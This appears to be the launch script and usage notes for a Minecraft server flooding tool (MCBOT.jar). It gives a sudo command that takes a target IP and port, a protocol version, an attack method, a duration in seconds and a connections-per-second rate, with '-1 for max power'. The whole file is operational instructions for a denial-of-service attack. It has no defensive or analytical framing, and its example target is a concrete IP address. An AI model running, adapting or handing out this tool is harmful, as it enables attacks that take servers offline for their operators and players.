#for linux open terminal in this folder and do sudo bash run.sh
sudo java -jar MCBOT.jar <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>
 
#<IP:PORT>       - IP and port of the server             | Examples: 36.90.48.40:25577 or mc.server.com
#<PROTOCOL>      - Protocol version of the server        | see protocl file for list of all protcols 
#<METHOD>        - Which method should be used to attack | see methods files for all methods
#<SECONDS>       - How long should the attack last       | Examples: 60 or 300
#<TARGET CPS>     - How many connections per second       | Examples: 1000 or 50000 (-1 for max power)
